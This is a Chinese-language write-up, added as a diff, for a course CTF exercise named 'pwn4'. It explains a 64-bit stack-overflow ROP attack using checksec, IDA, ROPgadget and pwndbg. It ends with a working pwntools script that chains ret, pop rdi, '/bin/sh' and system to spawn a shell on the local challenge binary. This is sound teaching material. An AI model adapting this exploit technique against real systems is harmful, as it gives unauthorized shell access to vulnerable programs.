@@ -1,0 +1,60 @@
+### 题目：pwn4
+
+### 考点：
+
+- 64位ROP攻击
+- 栈溢出攻击
+
+### 解题思路：
+
+- 首先使用`checksec`工具查看`pwn4`状态![checksec](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn4\images\checksec.png)
+
+- 由图可知`pwn4`为64位程序，且开启了DEP机制，因此可以使用ROP攻击，只不过由于64位程序函数前6个参数会存储在寄存器rdi，rsi，rdx，rcx，r8，r9中，因此需要使用`ROPgadget`工具寻找可用片段将参数传入寄存器rdi中。
+
+- 使用`ida64`工具打开，获取到重要地址`stack_flow`, `system`, `"/bin/sh"`的地址，使用`ROPgadget`工具获取到`pop rdi, ret`片段的地址：
+
+
+| 函数或字符串 | 地址      |
+| ------------ | --------- |
+| stack_flow   | 0x040061B |
+| system       | 0x0400480 |
+| "/bin/sh"    | 0x04006FF |
+| pop rdi, ret | 0x0400693 |
+
+- 使用`pwndbg`来动态调试，在`stack_flow`函数下断点，可见传入`read`函数的参数为`0x20`个字节，要覆盖到寄存器`rbp`，需要`0x20+8`个输入；
+
+- 构造python脚本，需要构造payload向pwn4传入(0x20+8)字符覆盖到函数返回地址，然后加入system函数地址，并传入参数。
+
+  ```python
+  from pwn import *
+  
+  context(arch="amd64", log_level="debug")
+  p = process('./pwn4')
+  
+  stack_flow = 0x40061B
+  system = 0x400480
+  bin_sh = 0x4006FF
+  pop_rdi = 0x400693
+  ret = 0x4005F3
+  
+  b = '04005F2'
+  
+  p.recvuntil("Give me your payload")
+  payload = flat(b'b'*(0x20 + 8), ret, pop_rdi, bin_sh, system)
+  gdb.attach(p, f'b *0x{b}')
+  p.send(payload)
+  p.interactive()
+  ```
+
+  注：如果不加`ret`，`pop rdi`栈地址为`0x47e4b8`末尾不为0，因此无法正确执行，所以需要加入ret，使后面命令对齐。
+
+![stack-1](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn4\images\stack-1.png)
+
+​		加入`ret`后栈的情况。
+
+![stack](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn4\images\stack.png)
+
+- 结果成功利用栈溢出获取到shell：
+
+![result](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn4\images\result.png)
+
